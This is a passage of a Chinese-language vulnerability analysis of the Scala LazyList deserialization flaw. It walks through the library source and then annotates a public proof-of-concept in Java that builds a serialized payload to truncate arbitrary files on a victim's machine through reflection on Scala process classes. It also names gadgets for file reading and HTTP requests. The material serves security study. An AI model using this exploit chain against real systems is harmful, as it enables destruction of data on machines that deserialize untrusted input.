<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span>  <span style="color:#66d9ef">protected</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">def</span> writeReplace<span style="color:#f92672">()</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">AnyRef</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>knownNonEmpty<span style="color:#f92672">)</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SerializationProxy</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">](</span><span style="color:#66d9ef">this</span><span style="color:#f92672">)</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">this</span>
</span></span></code></pre></div><p>当已经被求值且仍有值未被取走，将调用<code>SerializationProxy</code>的序列化以及反序列化方法。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span>  <span style="color:#a6e22e">@SerialVersionUID</span><span style="color:#f92672">(</span><span style="color:#ae81ff">3L</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SerializationProxy</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">](</span><span style="color:#a6e22e">@transient</span> <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">var</span> coll<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">])</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">Serializable</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">def</span> writeObject<span style="color:#f92672">(</span>out<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">ObjectOutputStream</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      out<span style="color:#f92672">.</span>defaultWriteObject<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> these <span style="color:#66d9ef">=</span> coll
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>these<span style="color:#f92672">.</span>knownNonEmpty<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        out<span style="color:#f92672">.</span>writeObject<span style="color:#f92672">(</span>these<span style="color:#f92672">.</span>head<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        these <span style="color:#66d9ef">=</span> these<span style="color:#f92672">.</span>tail
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      out<span style="color:#f92672">.</span>writeObject<span style="color:#f92672">(</span><span style="color:#a6e22e">SerializeEnd</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      out<span style="color:#f92672">.</span>writeObject<span style="color:#f92672">(</span>these<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">def</span> readObject<span style="color:#f92672">(</span>in<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">ObjectInputStream</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      in<span style="color:#f92672">.</span>defaultReadObject<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">val</span> init <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> initRead <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> <span style="color:#f92672">(!</span>initRead<span style="color:#f92672">)</span> in<span style="color:#f92672">.</span>readObject <span style="color:#66d9ef">match</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SerializeEnd</span> <span style="color:#66d9ef">=&gt;</span> initRead <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> a <span style="color:#66d9ef">=&gt;</span> init <span style="color:#f92672">+=</span> a<span style="color:#f92672">.</span>asInstanceOf<span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">val</span> tail <span style="color:#66d9ef">=</span> in<span style="color:#f92672">.</span>readObject<span style="color:#f92672">().</span>asInstanceOf<span style="color:#f92672">[</span><span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]]</span>
</span></span><span style="display:flex;"><span>      coll <span style="color:#66d9ef">=</span> init <span style="color:#f92672">++:</span> tail
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">def</span> readResolve<span style="color:#f92672">()</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Any</span> <span style="color:#f92672">=</span> coll
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>在进行序列化时将调用<code>writeObject</code>方法。</p>
<p>首先将会调用输出流对象的<code>defaultWriteObject</code>方法，然后调用<code>LazyList</code>对象<code>these</code>的<code>knownNonEmpty</code>方法判断是否已经被求值且仍有值未被取走若条件成立则将被取出的值进行常规的序列化，然后将剩余值的计算方法（<code>tail</code>）赋值给<code>these</code>变量。当所有的被计算过的值都被取出后则退出循环，然后插入一个序列化终止标志，最后再将<code>these</code>进行序列化。插入序列化终止标志是为了分割两种不同的序列化对象，终止标志前的部分为被计算过的值，而后面的部分为剩余值的计算方法（<code>tail</code>）。</p>
<p>在进行反序列化时将先调用<code>readObject</code>方法，再调用<code>readResolve</code>方法。</p>
<p><code>readObject</code>方法中，首先调用输入流对象的<code>defaultReadObject</code>方法，然后创建缓冲列表<code>init</code>用以存储被反序列化的计算值，标志<code>initRead</code>用以判断计算值是否被读取完毕，若读取完毕则反序列化剩余值的计算方法并赋值给<code>tail</code>变量，然后调用<code>init</code>的<code>++:</code>方法，对已计算值与计算方法进行连接。</p>
<h4 id="323-lazylist反序列化漏洞成因">3.2.3 LazyList反序列化漏洞成因<a hidden class="anchor" aria-hidden="true" href="#323-lazylist反序列化漏洞成因">#</a></h4>
<p>在调用<code>++:</code>方法时漏洞产生了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#a6e22e">@inline</span> <span style="color:#66d9ef">override</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">def</span> <span style="color:#f92672">++:</span> <span style="color:#f92672">[</span><span style="color:#66d9ef">B</span> <span style="color:#66d9ef">&gt;:</span> <span style="color:#66d9ef">A</span><span style="color:#f92672">](</span>prefix<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">IterableOnce</span><span style="color:#f92672">[</span><span style="color:#66d9ef">B</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">CC</span><span style="color:#f92672">[</span><span style="color:#66d9ef">B</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> prependedAll<span style="color:#f92672">(</span>prefix<span style="color:#f92672">)</span>
</span></span></code></pre></div><p><code>prependedAll</code>方法在<code>LazyList</code>中被重写</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">override</span> <span style="color:#66d9ef">def</span> prependedAll<span style="color:#f92672">[</span><span style="color:#66d9ef">B</span> <span style="color:#66d9ef">&gt;:</span> <span style="color:#66d9ef">A</span><span style="color:#f92672">](</span>prefix<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">collection.IterableOnce</span><span style="color:#f92672">[</span><span style="color:#66d9ef">B</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">B</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>knownIsEmpty<span style="color:#f92672">)</span> <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">.</span>from<span style="color:#f92672">(</span>prefix<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>prefix<span style="color:#f92672">.</span>knownSize <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#66d9ef">this</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> newLL<span style="color:#f92672">(</span>stateFromIteratorConcatSuffix<span style="color:#f92672">(</span>prefix<span style="color:#f92672">.</span>iterator<span style="color:#f92672">)(</span>state<span style="color:#f92672">))</span>
</span></span></code></pre></div><p><code>knownIsEmpty</code>方法用于判断计算方法中是否仍有值未被计算</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#75715e">// stateEvaluated 需要为true，即有值被计算过  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">@inline</span> <span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">def</span> knownIsEmpty<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> stateEvaluated <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">(</span>isEmpty<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">@inline</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p><code>isEmpty</code>方法判断是否有值仍未被计算</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">override</span> <span style="color:#66d9ef">def</span> isEmpty<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> state eq <span style="color:#a6e22e">State</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Empty</span>
</span></span></code></pre></div><p>前面已经提到过<code>state</code>来自<code>lazyState</code>方法的计算结果，而<code>lazyState</code>来自于实例化<code>LazyList</code>对象时传的一个无参匿名函数。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#a6e22e">@SerialVersionUID</span><span style="color:#f92672">(</span><span style="color:#ae81ff">3L</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">+A</span><span style="color:#f92672">]</span> <span style="color:#a6e22e">private</span><span style="color:#f92672">(</span><span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">var</span> lazyState<span style="color:#66d9ef">:</span> <span style="color:#f92672">()</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">.</span><span style="color:#a6e22e">State</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">])</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">AbstractSeq</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">LinearSeq</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">LinearSeqOps</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span>, <span style="color:#66d9ef">LazyList</span>, <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">IterableFactoryDefaults</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span>, <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">Serializable</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">import</span> LazyList._
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">@volatile</span> <span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">var</span> stateEvaluated<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">@inline</span> <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">def</span> stateDefined<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> stateEvaluated
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">var</span> midEvaluation <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">lazy</span> <span style="color:#66d9ef">val</span> state<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">State</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// if it&#39;s already mid-evaluation, we&#39;re stuck in an infinite
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// self-referential loop (also it&#39;s empty)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>midEvaluation<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">RuntimeException</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;self-referential LazyList or a derivation thereof has no more elements&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    midEvaluation <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> res <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">try</span> lazyState<span style="color:#f92672">()</span> <span style="color:#66d9ef">finally</span> midEvaluation <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// if we set it to `true` before evaluating, we may infinite loop
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// if something expects `state` to already be evaluated
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    stateEvaluated <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>    lazyState <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">null</span> <span style="color:#75715e">// allow GC
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    res
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>那么，如果在创建<code>LazyList</code>对象时给其传任意一个无参匿名函数，岂不是可以实现任意无参匿名函数调用。</p>
<h4 id="324-lazylist反序列化漏洞利用">3.2.4 LazyList反序列化漏洞利用<a hidden class="anchor" aria-hidden="true" href="#324-lazylist反序列化漏洞利用">#</a></h4>
<p>在知道了漏洞的成因后，如何寻找可利用的匿名函数是个难点。github中流传着该漏洞的POC。对该<code>POC</code>代码进行分析，入口点为：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> poc.cve.lazylist.payload;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> poc.cve.lazylist.function0.DefaultProviders;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Main</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// 这是一个进行任意文件擦除的例子</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> IOException {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 要被擦除的文件路径</span>
</span></span><span style="display:flex;"><span>        String fileToTruncate <span style="color:#f92672">=</span> args<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 是否进行追加</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">boolean</span> append <span style="color:#f92672">=</span> Boolean.<span style="color:#a6e22e">parseBoolean</span>(args<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 创建Payload生成器对象</span>
</span></span><span style="display:flex;"><span>        PayloadGenerator payloadGenerator <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> LazyList(DefaultProviders.<span style="color:#a6e22e">FILE_OUTPUT</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 生成Payload</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> payload <span style="color:#f92672">=</span> payloadGenerator.<span style="color:#a6e22e">generatePayload</span>(fileToTruncate, append);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">write</span>(payload);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>在创建<code>payloadGenerator</code>对象时使用的<code>DefaultProviders.FILE_OUTPUT</code>是一个<code>Function</code>对象</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> Function<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">[]</span>, Function0<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;&gt;</span> FILE_OUTPUT <span style="color:#f92672">=</span> DefaultProviders::fileOutput;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  * When invoked, instantiates new FileOutputStream(String fileName,  boolean append) with controlled parameters is
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  * called. If append is false, right after creating, specified file  is truncated (written with 0). Which means you can
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  * truncate any file on victim&#39;s machine which victim has write access to.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  * @param args args[0]: String, file name to truncate; args[1]:  boolean, whether to append or overwrite.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  * @return Function0 instance which can overwrite any file with  zero when Object apply() is invoked
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Function0<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">fileOutput</span>(Object<span style="color:#f92672">[]</span> args) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 文件路径</span>
</span></span><span style="display:flex;"><span>        String fileToTruncate <span style="color:#f92672">=</span> (String) args<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 是否追加</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">boolean</span> append <span style="color:#f92672">=</span> (Boolean) args<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 通过反射的方式获得scala.sys.process.ProcessBuilderImpl$FileO utput$$anonfun$$lessinit$greater$3 类的实例</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 之所以通过反射的方式获取因为ProcessBuilderImpl被private修饰</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ReflectionUtil.<span style="color:#a6e22e">newInstance</span>(<span style="color:#e6db74">&#34;scala.sys.process.Process BuilderImpl$FileOutput$$anonfun$$lessinit$greater$3&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{ ProcessBuilder$.<span style="color:#a6e22e">class</span>, File.<span style="color:#a6e22e">class</span>, <span style="color:#66d9ef">boolean</span>.<span style="color:#a6e22e">class</span>},
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span> {<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">new</span> File(fileToTruncate), append});
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p><code>generatePayload</code>方法</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String LAZY_LIST_CLASSNAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;scala.collection.immutable.LazyList&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@Override</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">generatePayload</span>(Object... args) {
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// 构造无参匿名函数</span>
</span></span><span style="display:flex;"><span>   Function0<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> function0 <span style="color:#f92672">=</span> function0Provider.<span style="color:#a6e22e">apply</span>(args);
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// 创建LazyList</span>
</span></span><span style="display:flex;"><span>   Object lazyList <span style="color:#f92672">=</span> createLazyList(function0);
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// 模拟writeReplace方法</span>
</span></span><span style="display:flex;"><span>   Object serializationProxy <span style="color:#f92672">=</span> ReflectionUtil.<span style="color:#a6e22e">newInstance</span>(<span style="color:#e6db74">&#34;scala. collection.immutable.LazyList$SerializationProxy&#34;</span>,
</span></span><span style="display:flex;"><span>            lazyList);
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// 序列化</span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span>  SerdeUtil.<span style="color:#a6e22e">serialize</span>(serializationProxy);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>function0Provider</code> 即前面传入的<code>FILE_OUTPUT</code>，通过调用其注入器方法<code>apply</code>显式的构造一个<code>Function0</code>类型的对象，然后将该对象传入到<code>createLazyList</code>创建一个<code>LazyList</code>对象，最终使用<code>SerializationProxy</code>进行包装（参考<code>LazyList writerePlace</code>方法）最终将该对象序列化。</p>
<p>在调用<code>createLazyList</code> 创建<code>LazyList</code>对象时首先通过反射的方式创建了<code>LazyList对</code>象，然后设置了其三个属性。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">createLazyList</span>(Function0<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> function0) {
</span></span><span style="display:flex;"><span>         <span style="color:#75715e">// 创建LazyList对象</span>
</span></span><span style="display:flex;"><span>        Object lazyList <span style="color:#f92672">=</span> ReflectionUtil.<span style="color:#a6e22e">newInstance</span>(LAZY_LIST_ CLASSNAME, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> {Function0.<span style="color:#a6e22e">class</span>}, function0);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Object emptyLazyListState <span style="color:#f92672">=</span> ReflectionUtil.<span style="color:#a6e22e">getStaticField</span>(<span style="color:#e6db74">&#34;scala.collection.immutable.LazyList$State$Empty$&#34;</span>, <span style="color:#e6db74">&#34;MODULE$&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 设置Empty对象类型的state，以便反序列化能够结束</span>
</span></span><span style="display:flex;"><span>        ReflectionUtil.<span style="color:#a6e22e">setField</span>(lazyList, <span style="color:#e6db74">&#34;scala$collection$immutable$LazyList$$state&#34;</span>, emptyLazyListState);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 设置stateEvaluated 在进行KonwnonEmpty检查时确保进入到isEmpty方法中</span>
</span></span><span style="display:flex;"><span>        ReflectionUtil.<span style="color:#a6e22e">setField</span>(lazyList, <span style="color:#e6db74">&#34;scala$collection$immutable$LazyList$$stateEvaluated&#34;</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 避免序列化过程中在本地触发Payload</span>
</span></span><span style="display:flex;"><span>        ReflectionUtil.<span style="color:#a6e22e">setField</span>(lazyList, <span style="color:#e6db74">&#34;bitmap$0&#34;</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> lazyList;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>在<code>POC</code>中除了提供<code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code>外，还提供了另外两个可使用的匿名函数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 可进行文件读取</span>
</span></span><span style="display:flex;"><span>scala.<span style="color:#a6e22e">sys</span>.<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">ProcessBuilderImpl$FileInput$$anonfun$$lessinit$greater$2</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 可发起http请求</span>
</span></span><span style="display:flex;"><span>scala.<span style="color:#a6e22e">sys</span>.<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1</span>
</span></span></code></pre></div><p>那么在<code>Scala</code>源码中着三个匿名函数来自哪里。</p>
